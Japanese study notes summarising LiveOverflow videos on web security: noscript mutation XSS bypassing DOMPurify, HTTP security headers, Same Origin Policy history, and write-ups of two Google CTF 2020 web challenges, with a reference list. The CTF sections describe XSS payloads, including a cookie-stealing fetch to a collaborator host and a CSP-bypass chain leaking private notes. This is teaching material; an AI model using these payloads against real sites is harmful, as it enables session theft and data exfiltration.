- **この「同じ形なのに文脈で解釈が変わる」性質が mutation XSS の土台**。仕様に書かれた挙動もあれば、特定ブラウザ固有の挙動もある。

### 9-3. DOMPurify の仕組み（`<template>` の利用）

- DOMPurify（メンテナ: Mario Heiderich / Cure53。Masato Kinugawa も同社）は `purify.js` 内で **`template` 要素を生成**する。
- 実演:
  - `div.innerHTML = '<img src=x onerror=alert(1)>'` → **即座に画像読み込みが走り alert が出る**。
  - `template.innerHTML = '<img src=x onerror=alert(1)>'` → **何も起きない**。しかし `template.content` の子要素として `img` が取得でき、DOM操作で `onerror` 属性を削除できる。
  - 消毒後に `innerHTML` で安全なHTML文字列を取り出し、本物のドキュメントに入れる。
- **これがクライアントサイドサニタイズの基本形**。

### 9-4. Masato の発見 — `<noscript>` のパース差異

- Masato のペイロードは `noscript` 要素を使う。`template.innerHTML` に入れると、DOMツリーは
  - `noscript` → 中に `p`、`p` の `title` 属性の文字列として `</noscript><img …>` が入っている（＝**属性値なので無害に見える**）。
- サニタイザは「危険な要素はない、安全だ」と判定する。
- ところが**同じ文字列を `div.innerHTML` に入れると、画像リクエストが飛び `alert(1)` が発火する**。DOMを見ると `noscript` が開き、テキストが続き、`</noscript>` で閉じられ、**`img` が本物のHTMLタグになっている**。
- **原因はHTML仕様そのもの**（動画の引用、**逐語**）:
  > "The noscript element represents nothing if scripting (so javascript) is enabled, and represents its children if javascript is disabled. It is used to present different markup to user agents (so browsers) that support scripting and those that don't support scripting, **by affecting how the document is parsed**."
- 決定打: **ブラウザ本体ではJSが有効だが、`template` 要素の中ではJSが「無効」扱いになる**。よって `template` 内と本文中で `noscript` のパース結果が食い違う ＝ **parser differential**。

### 9-5. Google Search における実際の経路と修正

- デバッグ手法（**教科書に載せる価値のあるTips**）: ペイロードに `debugger;` 文を仕込むと、XSS発火時にJSデバッガでブレークする。そこからコールスタックを遡って「どこでどうして発火したか」を突き止められる（**逐語**: "this is a good tip when trying to debug a more complex DOM XSS to see where and why it fired"）。
- コールスタックを1階層上がると、文字列 `b` が `a.innerHTML` に代入されている箇所に到達。Google側も `template` 要素を使う独自サニタイザを持っていた。
- **修正はGoogleによって極めて速やかに行われた**。LiveOverflowは古い脆弱なJSと新しいJSを保存してdiffし、`innerHTML` が **追加のXMLサニタイザ呼び出しに置き換えられている**ことを確認。
- 根本原因: Googleのオープンソース JS ライブラリ **closure-library**。修正コミット `https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa` は、**2018年9月26日の変更のロールバック**だった。その変更は（インタフェース設計上の都合で）**追加のサニタイズ段を削除**してしまっていた。
- 結果（**逐語**）: "the XSS existed for roughly 5 months in THE google javascript library, and likely affected many many google products that relied on that sanitizer."

### 9-6. 教科書に落とすべき結論

1. HTMLサニタイズは**ブラウザのパーサを使え**（`<template>`）。自前の正規表現やサーバ側パーサでやるな。
2. それでも **パーサ差異（parser differential）が残る**。`<noscript>`、`<math>`/`<svg>` の foreign content、`<template>` 内のスクリプト無効化などが差異の源。
3. 「サニタイズした文字列」と「実際に挿入する文脈」でパーサの状態が同一であることを保証しなければならない。
4. ライブラリの**サニタイズ段を「使いにくいから」と外す変更**が5ヶ月間の全社的XSSを生んだ。セキュリティ機構の削除はコードレビューの最重要監視対象。

---

## 10. 「Missing HTTP Security Headers - Bug Bounty Tips」詳細
（出典: LiveOverflow 動画 `064yDG7Rz80` トランスクリプト全文、2022-03-16、115,843再生。**Google VRP（bughunters.google.com）からの委託制作**であることを動画冒頭で明示）

本動画は「セキュリティヘッダが無い＝脆弱性」と短絡する報告が多すぎる現状への**バランスを取る**ための教材。バグバウンティの「有効/無効」判断を学ぶ最良の素材。

> 動画冒頭の姿勢（**逐語**）: "there is basically no content that tries to balance the sides a bit and so in this video I try to be like 'calm down. Chill. The world is not gonna end' if a site didn't use certain security headers."
> 利益相反の明示（**逐語**）: "Google paid for this video but not to be shown on here. […] This video was produced for google, to be embedded on their site."

レスポンスヘッダは2分類される: **付けるとセキュリティを「弱める」もの**と、**付けると「強める」もの**。

### 10-1. `X-Frame-Options`（クリックジャッキング）

- 効果: 他サイトが `<iframe>` で自サイトを埋め込むのを防ぐ（`SAMEORIGIN` / `DENY`）。
- しかし: **クリックジャッキングで実害が出る機能がそもそも無いサイトでは、ヘッダが無くても安全**。
- 逆のケース: **YouTubeは埋め込まれたい**（SHAREの埋め込みHTML）。だから絶対に `X-Frame-Options` を付けない。それは仕様であって欠陥ではない。
- 判断基準: 「重大な機能 + クリックジャッキング」＝脆弱性。「退屈で低リスクな機能 + クリックジャッキング」＝ほぼ無意味。
- **逐語**: "you shouldn't blindly follow best-practice guides, or scanners that tell you that the header is missing. You need to understand if there is actual impact."

### 10-2. `Content-Security-Policy`（CSP）

- CSPは理論上ほぼ全てのXSSを防げるうえ、`frame-ancestors: none` で `X-Frame-Options` 相当も担える。
- 実演: Google の bughunter サイト自体に **CSPが無い**。Google製の **CSP Evaluator** に空ポリシーを入れると `script-src [missing]` が **High severity** として報告される。
- しかし LiveOverflow の判断: CSPは **防御（defense in depth）であって修正ではない**。XSSが存在するときに**悪用を阻止する**ものに過ぎない。
- **逐語**: "If there is an XSS CSP doesn't fix it, it could just block exploitation. it's a defense in depth strategy. […] missing CSP in itself is not really a vulnerability."

### 10-3. `Strict-Transport-Security`（HSTS）

- 効果: ユーザが `http://` で来ても以後HTTPSに強制する。中間者攻撃の緩和。
- しかし仕様上の限界（動画が引用、**逐語**）:
  > "The Strict-Transport-Security header is ignored by the browser when your site is accessed using HTTP; this is because an attacker may intercept HTTP connections and inject the header or remove it. [ONLY] When your site is accessed over HTTPS with no certificate errors, the browser knows your site is HTTPS capable and will honor the Strict-Transport-Security header."
- つまり **「一度安全に読み込まれたあとにしか効かない」**（TOFU問題）。しかもモダンブラウザは**HSTSが無くても**同等の挙動をする（実演: `liveoverflow.com` に `http://` でアクセスすると1回目はリダイレクト、2回目以降は**HTTPリクエスト自体が出ない**）。
- 価値があるのは **HSTS preload リスト**（Googleのプロジェクト）との併用。
- Google自身の見解（動画が引用、**逐語**）: "Internally, we are already well aware of our HSTS posture and are actively working on adding HSTS support to additional endpoints" ＝**既知の課題であり、報告する価値がない**。

### 10-4. CORS設定ミス（「弱める」側のヘッダ）

**最も重要な判別基準がここ**。同じ「全オリジン許可」でも、認証方式によって深刻度がまるで違う。

| サイトの認証方式 | 寛容なCORS設定の影響 |
| --- | --- |
| **Cookieセッション認証** + `Access-Control-Allow-Credentials: true` | **重大**。ブラウザがセッションCookieを付けて送り、**しかもレスポンスを読める**。影響はCSRF/XSS相当（認証済みリクエスト＋レスポンス読み取り） |
| **トークン認証**（コードが `Authorization` ヘッダを付ける） | **問題なし**。セッションCookieが無く、ブラウザは `Authorization` ヘッダを自動付与しない。認証されないのでCSRF類似の攻撃は成立しない |

- さらに: Googleの多くのサイトは**意図的にCORSを開いている**（公開APIとして他オリジンからのアクセスを想定）。**「オープンなCORS＝設定ミス」と機械的に報告してはいけない**。

### 10-5. Cookie の `HttpOnly` フラグ

- 効果: JSからCookieを読めなくする。XSSによるCookie窃取を防ぐ。
- しかし **"it's rather ineffective."**: XSSがあるなら、攻撃者はCookieを盗まなくても**そのページから認証済みリクエストを直接投げればよい**。
- また、そもそも**全てのCookieが認証用とは限らない**。UIの設定値などを入れたCookieに `HttpOnly` や `Secure` が無くても実害はない。

### 10-6. まとめ（動画の結論、教科書のバグバウンティ章へ）

> "There is a reason these security headers exist. They do really good things and can protect an application from exploiting other vulnerabilities. But them missing, doesn't necessarily create a vulnerability. […] You cannot blindly copy & paste the result of a scanner reporting that headers are missing. […] When it comes to bug bounty, always think about the realistic impact."

---

## 11. 「The Same Origin Policy - Hacker History」詳細
（出典: LiveOverflow 動画 `bSJm8-zJTzQ` トランスクリプト全文、2022-07-23、89,228再生。Windows 95 + 実物のNetscapeを起動して実演する回）

### 11-1. 前史（1990年代前半）

- 構成要素は**Webサーバとブラウザの2つだけ**。URL（Location）を与えるとHTTPリクエストが飛び、HYPERTEXT（HTML）が返り、ブラウザがレンダリングする。真の力は **`<a>` タグによるリソース間リンク**にあった。
- 1994〜95年、Amazonが登場。オンラインバンキング・ショップ・Webメールが現れ、HTMLに `FORM` が加わる。

### 11-2. Cookieの発明（1994年6月、Netscape）

動画が引用する当時の説明（**逐語**）:
> "As you browse the web, any cookies which servers might send to your copy of Netscape are stored in your computer's memory. When you quit out of Netscape, any cookies that haven't expired are written to a cookie file so they can be reloaded next time you run Netscape."
> "Netscape Navigator does not send any cookies to any web server they're not for."

（出典URL: `https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html`）

### 11-3. LiveScript → JavaScript（1995年、Netscape 2.0）

- Netscape 2.0 beta 1 のリリースノート（**逐語**）: "LiveScript is currently implemented only on Windows. Other platforms will be supported in Beta 2."
- beta 2 で改称（**逐語**）: "Built-in JavaScript: […] Netscape Navigator now includes a built-in scripting language, called JavaScript. JavaScript is developed based on the JAVA language, which extends and enhances the capability of HTML documents. […] JavaScript is embedded in HTML documents with a SCRIPT tag, and there is no compilation needed to run the script."

### 11-4. 最初の攻撃 — frames による情報窃取（Netscape 2.0、1995年9月）

- 当時のWebは **`frameset` / `frame`**（今日の `iframe` の先祖）を多用。フレームはウィンドウUIの一部として統合され、サイズ変更もできた。JSからフレーム階層にアクセスできた。
- LiveOverflowの実演: **異なるドメインの2つのフレーム**（片方はログインページ、片方は攻撃者ページ）を持つ frameset を作る。攻撃者ページのJS `stealPassword()` は:
  1. `top` フレームに上がり、
  2. 2番目のフレームの `window` にアクセスし、
  3. その `document` に入り、
  4. 最初の `form` からユーザ名・パスワードの `value` を読み、
  5. `document.cookie` も読む。
- **クロスドメインなのに全部読める**。
- 評価（**逐語**）: "Just visit a malicious website, and using frames it could load for example your banking website, and steal your cookies, passwords or even perform transactions." / "From today's perspective, this is absolutely insane."
- 擁護（**逐語**）: "Keep in mind at this time, something like cross-site scripting didn't exist yet. They just invented javascript."

### 11-5. 修正 — Netscape 2.02 で SOP が発明される

- 2.02 で同じ攻撃を試すと `Forms cannot be indexed as an array` エラー。Cookieアクセスも失敗する。
- ところが **2.02 のリリースノートに書かれている「修正理由」はフレーム間の話ではない**（**逐語**）:
  > "Due to an implementation problem in Netscape Navigator 2.0, a privacy concern existed because it was possible for a server script to access the listing of local file names and directories on the user's machine. [...] Navigator 2.02 fixes this problem by refusing to allow a script from a server to view file names and directory listings from the local user's machine."
- LiveOverflowの推測: 当時のブラウザは**ローカルファイルシステムも閲覧できた**ので、`C:` ドライブをフレームに読み込んで `<a>` タグを全部拾えば**ローカルのファイル名一覧が盗める**。**これがおそらく史上初のJavaScript関連脆弱性**であり、Netscapeが真に問題視したのはそちらだった。
- SOPという概念として明文化されるのは **Netscape 3 のリリースノート**（**逐語**）:
  > "Navigator version 2.02 and later automatically prevents scripts on one server from accessing properties of documents on a different server."
- **逐語**: "So here Netscape just invented the same origin policy."

### 11-6. 当時の相対的な扱い（歴史的視点）

- 1995〜96年当時、SOPの重要性は自明ではなかった。**もっと強力な脆弱性が山ほどあった**から。
  - LiveOverflowの実演スクリプトだけでNetscapeが **segfault**（use-after-free と推測）。
  - Java Applet による**直接の任意コード実行**。1996年のBugtraq投稿（**逐語**）: "There is another serious security bug in the class loading code for all currently available Java browsers: Netscape up to and including versions 2.02 [...]" / "Using this bug, an attacker can bypass all of Java's security restrictions. This includes executing native code on the client, with the same permissions as the user of the browser. No preconditions are necessary other than viewing the attacker's web page, and the process can be made completely invisible to the victim."
- 結論（**逐語**）: "all the work done around this time would influence web security up until today."
- 本人のリサーチ姿勢（**逐語**）: "I'm not just presenting an article or a wikipedia page. I spend a lot of time reading mailing lists and web archives and trying to connect the dots." — **Internet Archive への寄付を視聴者に呼びかけている**。

---

## 12. 「XSS a Paste Service - Pasteurize (web) Google CTF 2020」詳細
（出典: LiveOverflow 動画 `Tw7ucd2lKBk` トランスクリプト全文、2020-09-09、59,931再生。260チームが解いた "easy" 問題）

### 12-1. 構造の把握（クライアントサイド課題の定型）

- ペーストを作成すると、**サーバが返す生HTML中ではノート要素は空**で、下方のJSに文字列として内容が埋め込まれている。それが `DOMPurify.sanitize()` を通って `innerHTML` に入る。
- LiveOverflowの判断（**重要な実務感覚**）: DOMPurifyは「HTMLを一部許可しつつXSSを防ぐ」用途で**入手できる最良のライブラリ**であり、メンテナを個人的に知っている。バイパスは稀で奇妙なエッジケースのみ。**よってここを破るのがゴールではない**と即断した。
- 決め手のヒント: ソース中のコメント **「fix the bug number 1337, in /source, that could lead to XSS」**。`/source` にNodeJSサーバのソースが公開されている。
- **「share with TJMike」ボタン** の存在＝XSS課題の定型（ボットに見せて攻撃する）。

### 12-2. サーバ側の（一見完璧な）エスケープ

- ノート表示ルートは `escape_string()` を通す。その実装は **`JSON.stringify()` を使う巧妙な手法**。文字列を渡せばJSON文字列としてエスケープされ、JavaScript文字列リテラルとして安全になる。
- さらにHTML文書に埋め込むので、`</script>` で壊されないよう**山括弧もエスケープ**している。**これは正しい実装**。

### 12-3. 実際の脆弱性 — `body-parser` の `extended: true`（型混同）

- チームメイト loknop が発見。着眼点は `bodyParser.urlencoded` の **`extended: true`**。
- `body-parser` のドキュメント: extended構文は rich object を許す。"For more information, please see the qs library."
- `qs` のドキュメント（**逐語**）: "qs allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets []"
- つまり POST body で `content[key]=value` と書くと、**サーバが文字列だと思っている `content` が「オブジェクト」になる**。
- `JSON.stringify()` に**オブジェクト**を渡すと、出力は `{"key":"value"}` のように**ダブルクォートを含む**。これがJS文字列リテラルの中に置かれると **クォートを閉じて外に出られる**。
- 成功ペイロードの形（**逐語**）: `Content, and in brackets we have dash, alert, dash, equal, dash, one, dash.`
  - 実際の形: `content[-alert()-]=-1-` のような、**キーと値をマイナス演算子で数式に仕立てる**構造。
  - 理由: 素直に `content[key]=value` にすると生成されるJSが `"" {"key":"value"} ""` のような構文エラー（`Unexpected identifier`）になる。**減算（や加算）で文字列と識別子を1つの式に繋ぐ**ことで、構文的に妥当なJSにする。`alert()` は減算の評価のために**実行される**。
- **教科書に落とす教訓**: サーバ側のエスケープが正しくても、**エスケープ関数に渡る値の「型」が想定外**（文字列のつもりがオブジェクト）なら破綻する。Express/`qs` の `extended: true` は**型混同（HTTP Parameter Pollution の親戚）の典型的な発生源**。→ PwnFunction の `HTTP Parameter Pollution Explained`（QVZBl8yxVX0）と直結する論点。
- 実務手順として、**Burp Repeater で `content[...]` の形に書き換えて送る**方法が実演される（Burp Community Edition の埋め込みChromeブラウザ機能を推奨）。

### 12-4. 「フラグはどこか」探索の試行錯誤（失敗過程も教材）

課題説明文 "third parties might have implanted it" に引きずられ、LiveOverflowは次を順に試して全部外した:

1. TJMikeが見ているHTML全体を `fetch` で外部に送って調査 → 何も無し。
2. "implanted" ＝ **Service Worker** が仕込まれている？ → 登録済みService Workerを列挙 → 無し。
3. "implanted" ＝ **iframe埋め込み**？ → `top` のURLを調べる → 無し。
4. "PASTE"urize ＝ コピペ？ → **`navigator.clipboard.readText()` でクリップボードを盗む** → 無し。
5. Service Workerを自分で仕込んでMITM → 同一ドメインのクリーンな `.js` が必要で不可。
6. TJ**Mike**（🎤） ＝ マイク録音？ → 実装が面倒でやらず。

**正解は最も基本的な `document.cookie`** だった。サイト自体はCookieを使っていないため誰も思いつかなかった。

- 最終ペイロード: `fetch('https://<collaborator>/?c=' + document.cookie)` 相当。Burp Collaborator（または各種 requestbin サービス）で受信。104.x のGoogleサーバIPからのリクエストにフラグが入ったCookieが含まれていた。
- LiveOverflowの反省（**逐語**）: "in the end I wish they had hinted more at the cookie."
- チーム運用の紹介: ALLES! は CTFPad を自作拡張した共有ノート基盤を使っており、チャレンジごとにMarkdownの共有ノートを持つ。

---

## 13. 「All The Little Things」（Google CTF 2020）詳細 — DOM Clobbering 総合演習
（出典: LiveOverflow 動画 `dZXaQKEE3A8`（Part 1/2, 2020-09-28）と `UGtrpXk6QVU`（Part 2/2, 2020-10-08）のトランスクリプト全文。**最終的に20チームのみ正解、ALLES!は終了2時間前に20番目＝最後の正解チーム**）

本ノート内で**クライアントサイド技法が最も高密度に登場する教材**。作者は terjanq。

### 13-1. 前提と構造

- 出題文: "I left a little secret in a note, but it's private, private is safe." / "Note: TJMike🎤 from Pasteurize is also logged into the page."
  → **Pasteurize（12節）のXSSが攻撃の起点**であることを示唆。
- サイト機能: ユーザ名＋プロフィール画像URLでログイン、設定（名前・画像・テーマ dark/light）、ノート作成（public/private）。**publicノートはPasteurizeドメインに、privateノートはlittlethingsドメインに表示される**。
- privateノートも DOMPurify を通る（`onerror` は除去される）。作者曰く、**Pasteurizeの脆弱性は元々この問題にあった意図しないバイパス**で、それを修正して入門用の別問題に仕立てたのがPasteurize。

### 13-2. 攻撃面の棚卸し（`theme.js` / `user.js` / `utils.js`）

- `utils.js`: DOMロード時に `/me` へ `fetch` → JSONを `make_user_object()` に渡す。
- `user.js`: `user` クラス生成。プロフィール画像を設定し、`update_theme()` を呼ぶ。さらに **`load_debug?.()`** という呼び出しがある（`?.` は「未定義なら何もしない」オプショナル呼び出し）。
- `theme.js`: `update_theme()` は `document.username` オブジェクトからテーマを取り、**`script` タグを生成して `cb`（callback）パラメータ付きのURLを埋め込む**。
  - そのエンドポイントは **JSONP API**。レスポンスは `callback` パラメータの文字列を**関数名として呼ぶ**だけのJS。
  - **`callback` は比較的自由に選べる**。つまり **littlethingsドメイン上にホストされた、任意の関数を1回呼ぶだけのスクリプト**を作れる ＝ **Script Gadget**。（LiveOverflowは「Google Sheets XSS動画（`aCexqB9qi70`）でJSONPの危険性を紹介済み」と参照している）

### 13-3. DOM Clobbering の基礎（動画の説明をそのまま使える）

- ノートには**HTMLタグは通る**（XSSは通らない）。ここで **`id` / `name` 属性による DOM Clobbering** が使える。
- 実演: `<div id="bla">` を含むノートを作ると、JSコンソールで **`window.bla` がその `div` を指す**。
- 応用: `<div id="load_debug">` を作れば `window.load_debug` が「存在する」ようになる。ただし `HTMLDivElement` なので **`window.load_debug is not a function`** エラーになる。

### 13-4. 失敗した研究（Part 1の目玉、`Failed DOM Clobbering Research` という題名の由来）

LiveOverflowの仮説: **「HTML要素でありながら、関数としても呼び出せる要素があるのでは？」**

- 検証方法（実際にやったコード）:
  1. GitHubからHTML要素名の大きなリストを拾って JS 配列にする。
  2. 各タグについて `DOMPurify.sanitize()` を通し、**DOMPurifyを通過するタグだけ**に絞る。
  3. その要素に `id=x` を付けて挿入し、`window.x()` を `try-catch` で呼ぶ。
  4. 例外にならなければ `found!` と出す。
- **結果: 何も見つからなかった**。
- LiveOverflowの総括（**逐語**、研究姿勢として重要）: "This is a typical 'dumb' idea you might have, you test it, and you find out it doesn't work. But that's security research. I think it was a good idea and worth testing for."
- 他のclobber候補も検討し、いずれも没:
  - `window.USERNAME` → その後の代入で上書きされる。
  - `id="bootstrap-link"` の `querySelector` → **ノートがレンダリングされる前に実行される**ので間に合わない。

### 13-5. 見落としていた鍵 — `__debug__` GETパラメータ

- ソースを見返して発見。URLに `__debug__` を付けると **`debug.js` が追加読み込みされ、設定画面に追加HTMLが現れる**。
- `debug.js` が **`load_debug` 関数を定義する**。その中身が決定的:
  - **`window.name` の文字列をJSONとしてパース**し、
  - **`Object.assign()` でその内容を `user` オブジェクトにマージする**。
  - 追加機能: `verbose`、`showAll`（隠し要素を全部表示＝**隠しinputのCSRFトークンまで見える**）、`keepDebug`（全 `<a href>` に `__debug__` を付与）、`onerror` を `alert` で上書き。
- **`window.name` の特殊性**（この課題の心臓部、**逐語**）: "window.name persists across other websites." 同じタブで別サイトへ遷移しても `window.name` は保持される。
  → **Pasteurize上のXSSで `window.name` をセットし、littlethingsへリダイレクトすれば、任意のJSONを `user` オブジェクトにマージできる**。

### 13-6. Prototype 上書きによる getter 回避（Part 2）

- 狙い: `user.theme.callback` を `alert` にすれば、`update_theme()` が生成する `script` タグで任意の関数が呼ばれる。
- 障害: `Object.assign` が **`property theme has only a getter`** で失敗する。`user` クラスの `theme` は **getter関数**で、内部のプライベートフィールド `#theme` を読むだけ。セットできない。
- 解法（チームメイト managarmr の発案）: **`__proto__` を空オブジェクトに設定する**。プロトタイプにはgetter定義が含まれているので、**プロトタイプごと捨てればgetterも消える**。すると自前の `theme` 定義が通る。
- 結果: `alert` が発火。**プロトタイプ操作によるアクセサ無効化**という、Prototype Pollution とは別方向のテクニック。

### 13-7. 極度に制限された Script Gadget の育て方

- JSONPの `callback` に使える文字を総当たりで調べた結果、**英数字・`.`（ドット）・`=`（イコール）のみ**。括弧も引用符も使えない。
- 得られる能力は2つだけ:
  1. **任意の関数を1回呼べる**（引数は固定の変なオブジェクト、`.` があるので `Object.constructor.apply()` のような深い参照は可能）。
  2. **代入ができる**（`=`）。ただし右辺も必ず関数呼び出しになる。
- ブレークスルー1: **`document.body.innerHTML = <何か関数呼び出し>`** ができる。`alert` を使うと戻り値 `undefined` が入る（＝確かに書き込めている）。
- ブレークスルー2: **文字列をどうやって作るか**。`<input id=xss value="ペイロード">` をDOM Clobberingで用意し、`window.xss.value` を読みたい。しかし右辺は関数呼び出しでなければならない。
  → **`.toString()` を呼べばよい**。文字列に `toString()` を呼ぶと**その文字列自身が返る**。
- 障害3: **CSPが厳しい**。インラインイベントハンドラは `Refused to execute inline event handler because it violates the Content Security Policy`。予測不能な nonce 付き `script` か、`self` 上の `src` が必要。
  → **JSONPエンドポイントが `self` 上のスクリプトを提供してくれる**ので、`<script src="/theme?cb=...">` を複数注入して**プリミティブを組み合わせられる**。
- 障害4: **`innerHTML` で挿入した `script` は実行されない**（HTML5仕様、動画の引用**逐語**）:
  > "Note: script elements inserted using innerHTML do not execute when they are inserted."
  → **`<iframe srcdoc="...">` を使う**。`src` を指定せず `srcdoc` に文書を書くと**新しいドキュメント**が作られ、その中の `script` は実行される。
  - CSPは `iframe` の**特定ソース読み込み**は止めるが、**ソースを読み込まない `srcdoc`** は通った（**逐語**: "We are simply embedding an iframe inside this page with a custom document. And that document happens to have a script tag. Sneaky awesome trick."）。

### 13-8. 最終ペイロードの構造と、括弧なしXSS

- **最後のひらめき**: 当初は「`<input value=ペイロード>` を含むノート」を被害者に見せる必要があったが、**被害者は攻撃者のprivateノートを見られない**。
  → **`window.name` 自体を文字列ソースとして使う**。`window.name` は JSON に見えるがただのテキストなので、`innerHTML` に代入すれば **JSON部分はただのテキストとして表示され、中に埋め込んだHTMLタグだけがレンダリングされる**。
- 描画されるのは **`<iframe srcdoc=...>`**。その中身は:
  1. `<img id=x src="https://<burp-collaborator>/">` ← リーク用。
  2. **3本の `<script src="/theme?cb=...">`**（JSONP script gadget）。実行される3行は概ね:
     - `Object.prototype.toString = RegExp.prototype.toString`（全オブジェクトの `toString` を RegExp のものに差し替える）
     - `Object.prototype.source = <親ドキュメントのテキスト>`（iframeから `parent` に手を伸ばして全ノートIDを含むテキストを取る）
     - `x.src = x.src.concat(<obj>)`（画像のsrcに連結）
  - 仕掛け: `RegExp.prototype.toString` は内部で **`source` プロパティ**を読む。`Object.prototype.source` にリーク対象テキストを入れてあるため、`concat` が引数を文字列化する際に**引数のオブジェクトではなく、仕込んだテキストが連結される**。
  - 結果、`<img>` の `src` が `https://<collaborator>/<リークしたページテキスト>` になり、**画像読み込みリクエストとしてデータが外部送信される**。
- 出典の明示（**逐語**）: "We didn't come up with this. We actually went through all published research from the challenge author, terjanq, and we stumbled over this tweet. 'I recently discovered a fancy way to execute arbitrary XSS without parentheses. As far as I am concerned this is a novel technique 😁'"
  → **括弧なしXSS（parenthesis-less XSS）**という既知研究の変形。**出題者の公開研究を全部読むのは正攻法**という実務的教訓。

### 13-9. 攻撃の実行（2段階）

1. Pasteurize にXSS投稿を作る。ペイロードは `window.name` に攻撃JSONをセットし、`__debug__` 付きの littlethings のノート一覧へリダイレクトする。TJMike に share する。
   → 連鎖が発火し、**TJMikeのprivateノートIDの一覧**が collaborator にリークする。
2. 同じ手順を、今度は**特定ノートの本文**を対象にもう一度実行。
   → フラグが得られる。フラグ文言（**逐語**）: `When the world comes to an end, all that matters are these little things`

### 13-10. この2本から抽出できるクライアントサイド技法一覧（教科書の索引用）

1. DOM Clobbering（`id` / `name` による `window.*` / `document.*` の生成）
2. `window.name` のクロスオリジン永続性（サイト間でのデータ持ち越し）
3. `__proto__` 上書きによる getter/アクセサの無効化
4. JSONP エンドポイントの **script gadget** 化（`self` 上のスクリプト生成＝CSPバイパスの足場）
5. 文字クラスが極端に制限された状況での `.toString()` / `.concat()` の活用
6. `innerHTML` で挿入した `<script>` が実行されない仕様と、その回避としての `<iframe srcdoc>`
7. `Object.prototype` 汚染による組み込みメソッドの意味の書き換え（`RegExp.prototype.toString` + `source`）
8. 括弧なしXSS（terjanq）
9. `<img src>` による out-of-band データ持ち出し
10. `debugger;` 文と devtools コールスタックによる DOM XSS のデバッグ（9-5 参照）

---

## 14. 動画説明欄から抽出した一次参考文献リンク集
（出典: `liveoverflow_videos.jsonl` の各 `description` フィールド。**すべて逐語**。LiveOverflow本人が視聴者に提示している参照先なので、教科書の参考文献欄にそのまま使える）

| 参照元動画 | 参考文献URL（逐語） |
| --- | --- |
| The Browser is a very Confused Deputy (web 0x05) | `https://www.cis.upenn.edu/~KeyKOS/ConfusedDeputy.html`（Norm Hardy, "The Confused Deputy"） |
| XSS with AngularJS 0x1 / 0x3 | `http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html`（"XSS without HTML: Client-Side Template Injection with AngularJS"）／ `https://vimeo.com/165951806`（"An Abusive Relationship with AngularJS"）／ Mario Heiderich `https://cure53.de/` ／ Gareth Heyes @garethheyes |
| XSS with AngularJS 0x00 | `http://liveoverflow.com/angularjs/`（自分で試せる練習ページ） |
| XSS on Google Search | `https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa`（修正コミット） |
| How did Masato find the Google Search XSS? | `https://gist.github.com/LiveOverflow/dd3d09d17c8fc0460c7e9a337b501331`（fuzzing用gist） |
| Fuzzing Browsers for weird XSS Vectors | `https://twitter.com/garethheyes/status/1112661895067156481` ／ `http://shazzer.co.uk/vector/lt-eating-char`（insertScriptのベクタ） |
| The Curse of Cross-Origin Stylesheets | cgvwzq (2017) `https://bugs.chromium.org/p/chromium/issues/detail?id=788936` ／ filedescriptor (2014) `https://bugs.chromium.org/p/chromium/issues/detail?id=419383` ／ scarybeasts (2009) のバグ |
| HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! | `https://bugs.chromium.org/p/chromium/issues/detail?id=841105` ／ Orange Tsai `https://twitter.com/orange_8361` ／ "A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!" (CODE BLUE) `https://www.youtube.com/watch?v=2MslLrPinm0` ／ Black Hat US-17 スライド |
| XS-Search abusing the Chrome XSS Auditor | `https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning` ／ メイキング `https://www.youtube.com/watch?v=VI5OLNHf_Sc` |
| Script Gadgets! Google Docs XSS | 発見者 Nickolay `https://thisisqa.com/` |
| XSS a Paste Service - Pasteurize | John Hammond `https://www.youtube.com/watch?v=voO6wu_58Ew` ／ Gynvael part 1 `https://www.youtube.com/watch?v=0wUDA0oh8sQ` ／ part 2 `https://www.youtube.com/watch?v=OYP9hvy4MHQ` |
| Failed DOM Clobbering Research (1/2) | 課題 `https://capturetheflag.withgoogle.com/challenges/web-littlethings` ／ 前提動画 Pasteurize `https://www.youtube.com/watch?v=Tw7ucd2lKBk` |
| XSS on the Wrong Domain (Tech Support) | 課題 `https://capturetheflag.withgoogle.com/challenges/web-typeselfsub` ／ `https://typeselfsub.web.ctfcompetition.com/` |
| DO NOT USE alert(1) for XSS | ブログ版 `https://liveoverflow.com/do-not-use-alert-1-in-xss/` |
| Missing HTTP Security Headers | **Google VRP向け動画の全再生リスト** `https://www.youtube.com/playlist?list=PLY-vqlMAnJ9bGoI82H1BB8BE4A8H2OCA-` |
| Authorization vs. Authentication | `https://bughunters.google.com`（Google VRP委託制作であることを明記） |
| The Same Origin Policy - Hacker History | Netscapeのcookie説明 `https://web.archive.org/web/19970605224124/http://help.netscape.com/kb/client/970226-2.html` ／ Netscape 2.0b1 LiveScript `https://web.archive.org/web/20021212124306/http://wp.netscape.com:80...` |
| The Three JavaScript Hacking Legends | Bugtraq 1997 LoVerso `https://seclists.org/bugtraq/1997/Jun/88` ／ LoVersoサイト `https://web.archive.org/web/19970607122219/http://www.osf.org/~loverso/javascript/` ／ dir.html PoC `https://web.archive.org/web/19970607185809/http://www.osf.org/~loverso/javascript/d...` |
| The Age of Universal XSS | "Jabadoo Security Hole in Explorer 4.0" `https://seclists.org/bugtraq/1997/Oct/85` |
| The Origin of Cross-Site Scripting (XSS) | **再生リスト "The History of XSS"** `https://www.youtube.com/playlist?list=PLhixgUqwRTjyakFK7puB3fHVfXMinqMSi` |
| What is a Browser Security Sandbox? | 長尺版（ストリームQ&A） `https://www.youtube.com/watch?v=VEaoDFdq95g` |
| Reverse Engineering Obfuscated JavaScript | PoC `https://liveoverflow.com/poc/popunder.html` |
| Reverse Engineering PopUnder Trick for Chrome | `https://bugs.chromium.org/p/chromium/issues/detail?id=752630`（Mac）／ `https://bugs.chromium.org/p/chromium/issues/detail?id=752824`（Windows） |
| Solving a JavaScript crackme: JS SAFE 2.0 | 解答スクリプト `https://gist.github.com/LiveOverflow/bbdffe3777ce0f008b452e0a789cef65` ／ John Hammond `https://www.youtube.com/user/RootOfTheNull` |
| browser 0x00 | ブログ `https://liveoverflow.com/getting-into-browser-exploitation-new-series-introduction-browser-0x00/` |
